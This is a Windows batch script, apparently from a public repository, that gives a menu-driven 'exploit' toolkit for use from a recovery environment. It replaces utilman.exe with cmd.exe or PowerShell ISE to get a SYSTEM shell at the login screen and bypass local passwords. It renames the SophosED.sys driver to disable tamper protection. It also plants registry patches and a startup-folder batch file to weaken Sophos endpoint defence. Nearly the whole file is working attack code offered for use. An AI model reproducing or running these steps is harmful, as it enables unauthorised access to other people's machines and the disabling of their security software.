@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0
rem Contributors: Viren070

if /i "%CD:~0,2%" NEQ "X:" (
  color 0C
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-^'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script^!
  pause
  cls
  color 07
  exit 
) else (
  cls
  color 3F
  echo: & echo Proceed with caution, we do not take any responsibility for damage caused by this script.
  echo Credit to S1rDyno for the orginal script ^& Viren070 for contributing to improve it.
  echo: & echo https://github.com/Viren070/BootUSB-Crack-Script ^| OpenSource & echo: & echo: & echo:
  pause
)
:menu
color 07
cls
echo ^|==================================^|
echo ^|  WINDOWS 10 EXPLOIT BY Viren070  ^|
echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
echo ^|                                  ^|
echo ^|    BUILD ^| Production 23.9.2     ^|
echo ^|==================================^| & echo: & echo:

echo +++++ Password Exploit
echo ^[1^] Local Password Exploit
echo ^[2^] Local Password Exploit  ^- PowerShell method
echo ^[3^] Undo Password Exploit
echo ^[4^] Restore Original Files

echo: & echo +++++ Sophos Exploit
echo ^[5^] Disable Sophos Tamper Protection
echo ^[6^] Sophos Registry Exploit

echo: & echo +++++ Other
echo ^[7^] Show On-Screen Keyboard
echo: & echo +++++ Exit
echo ^[0^] Exit
echo: & echo: & echo:

set validOptions=0 1 2 3 4 5 6 7
set "crackType="
set /p "crackType=^>"

set optionFound=false
for %%a in (!validOptions!) do (
  if "!crackType!"=="%%a" (
    set optionFound=true
  )
)

if not !optionFound!==true (
  color 0C
  cls
  call :showDinoError
  echo Looks like that^'s an invalid option^!
  timeout /t 5 
  goto menu
)
if "!crackType!" EQU "0" (
  color 07
  cls & echo Exiting...
  exit 
)

if "!crackType!" EQU "1" (
  call :local-password-exploit
)

IF "!crackType!" EQU "2" (
  call :local-password-exploit-powershell
)
if "!crackType!" EQU "3" (
  call :undo-password-exploit
)

if "!crackType!" EQU "4" (
  call :restore-original-files
)

if "!crackType!" EQU "5" (
  call :disable-sophos-tamper-protection
)
if "!crackType!" EQU "6" (
  call :sophos-registry-exploit
)

if "!crackType!" EQU "7" (
  echo Running OSK.exe...
  start "" "C:\windows\system32\osk.exe" || goto :cmdFail
  color 0A
  cls
  echo Started OSK.exe 
  echo Returning to menu...
  timeout /t 5
  
  goto :menu
)

goto :menu


:local-password-exploit
cls
set "UtilmanOldPath=C:\Windows\System32\utilman.old"
echo Starting Hack
echo.
if exist "c:\windows\system32" (
  echo System Directory Found	
  if exist "%UtilmanOldPath%" (
    echo Found existing utilman.old, deleting...
    del "%UtilmanOldPath%"
  )

  echo Renaming utilman.exe to utilman.old
  echo.
  ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
  echo.
  echo Copying cmd.exe to utilman.exe
  echo.
  copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto :cmdFail

  echo -----------------------------------
  color 0A
  echo Exploit Completed ^| No errors
  pause
  goto menu

) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

:local-password-exploit-powershell
cls
echo Starting Hack...
echo. 
set "UtilmanPath=C:\Windows\System32\utilman.exe"
set "UtilmanOldPath=C:\Windows\System32\utilman.old"
set "PowershellPath=C:\Windows\System32\WindowsPowershell\v1.0\powershell_ise.exe"

if exist "%UtilmanOldPath%" (
  echo Deleting existing utilman.old
  del "%UtilmanOldPath%"
)

if exist "%UtilmanPath%" (
  echo Renaming utilman.exe to utilman.old 
  ren "%UtilmanPath%" utilman.old 
  echo. 
  echo Copying powershell.exe to utilman.exe 
  copy "%PowershellPath%" "%UtilmanPath%"
) else (
  call :showDinoError
  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
  echo Failing exploit and returning to menu
  timeout /t 5 
  goto menu 
)

echo -----------------------------------
color 0A
echo Exploit Completed ^| No errors
pause
goto menu


:disable-sophos-tamper-protection
cls
echo Starting Hack
if exist "c:\windows\system32\drivers" (
  echo System Directory Found
    
  if not exist "C:\windows\system32\drivers\SophosED.sys" (
    color 0C
    call :showDinoError
    echo SophosED.sys file could not be found 
    echo Failing Exploit and returning to menu 
    timeout /t 5
    goto :menu
  )
  echo Renaming SophosED.sys to SophosED.sys.old
  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
  
  color 0A
  echo -----------------------------------
  echo Exploit Completed ^| No errors
  pause
  goto menu


) else (
  color 0C
  call :showDinoError
  echo Could not find System Directory... & echo:
  echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
) 
goto menu

:sophos-registry-exploit
cls
echo Preparing Patch...

set "startupFolder=C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "sophosFolder=X:\sources\sophos"
set "registryPatch1=!sophosFolder!\1EndpointDefense.reg"
set "registryPatch2=!sophosFolder!\2SophosMCSAgent.reg"
set "autorunScript=!sophosFolder!\autorun.bat"

if not exist "!startupFolder!" (
  echo Could not find Startup folder...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!sophosFolder!" (
  echo Could not find Sophos folder...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!registryPatch1!" (
  echo Could not find Registry File number 1...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!registryPatch2!" (
  echo Could not find Registry File number 2...
  echo Failing Registry Patch
  goto :cmdFail
)

if not exist "!autorunScript!" (
  echo Could not find the Autorun Script...
  echo Failing Registry Patch
  goto :cmdFail
)

echo Patch files located^!
echo Starting Patch...

if not exist C:\SophosUtility (
  mkdir C:\SophosUtility || goto :cmdFail
)
copy "%sophosFolder%" C:\SophosUtility || goto :cmdFail
copy "C:\SophosUtility\sophos\evoke.bat" "%startupFolder%" || goto :cmdFail

echo -----------------------------------
echo Sophos Registry Patch Completed ^| No errors
echo Returning to Menu
timeout /t 5
goto menu 

:undo-password-exploit
cls
echo Preparing restore...
if exist "c:\windows\system32" (
  echo Located System folder
) else (
  color 0C
  call :showDinoError
  echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist "c:\windows\system32\utilman.old" (
  echo Original utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if not exist "c:\windows\system32\cmd.exe" (
  echo You seem to be missing the original cmd.exe file, try option 3 to restore it
)
if exist "c:\windows\system32\utilman.exe" (
  echo Exploited utilman.exe file found
) else (
  color 0C
  call :showDinoError
  echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo All system files located^! & echo: & echo Starting undo...
echo Renaming utilman.old to utilman.exe....
copy /y C:\windows\system32\utilman.old C:\windows\system32\utilman.exe || goto :cmdFail
del C:\windows\system32\utilman.old


color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:restore-original-files
cls
echo Preparing restore...
set "cmdBackup=X:\sources\restore\cmd.exe"
set "utilmanBackup=X:\sources\restore\utilman.exe"
set "UtilmanOldPath=C:\Windows\System32\utilman.old"

if exist "x:\sources\restore" (
  echo Located restore folder
) else (
  color 0C
  call :showDinoError
  echo Could not find Restore Folder, place the original files in a folder called restore... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist !cmdBackup! (
  echo Command Prompt backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Command Prompt backup, you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)
if exist !utilmanBackup! (
  echo Utilman backup found
) else (
  color 0C
  call :showDinoError
  echo Could not find Utilman backup,  you can find the original file in the GitHub repository... & echo: & echo Failing Exploit and returning to menu
  timeout /t 5 
  goto menu
)

echo Backup files located^! & echo: & echo Starting restore...

if exist "%UtilmanOldPath%" (
  echo Deleting existing utilman.old...
  del "%UtilmanOldPath%"
)
echo Restoring utilman.exe...
copy /y !utilmanBackup! C:\windows\system32 || goto :cmdFail
echo. & echo Restoring cmd.exe...
copy /y !cmdBackup! C:\windows\system32 || goto :cmdFail

echo Attempting restore using SFC & echo.
sfc /scanfile=c:\windows\system32\utilman.exe
sfc /scanfile=c:\windows\system32\cmd.exe
color 0A
echo -----------------------------------
echo Restore Completed ^| No errors
pause
goto menu

:cmdFail
echo ------------------------------------------------
call :showDinoError
echo An error occurred during command execution.
echo Failing Exploit and returning to menu
pause
goto menu

:showDinoError
color 0C
echo                __
echo               / _^)
echo      _.----._/ /
echo     /         /
echo  __/ ^(  ^| ^(  ^|
echo /__.-^'^|_^|--^|_^|
echo Exploit ID !crackType! failed & echo:
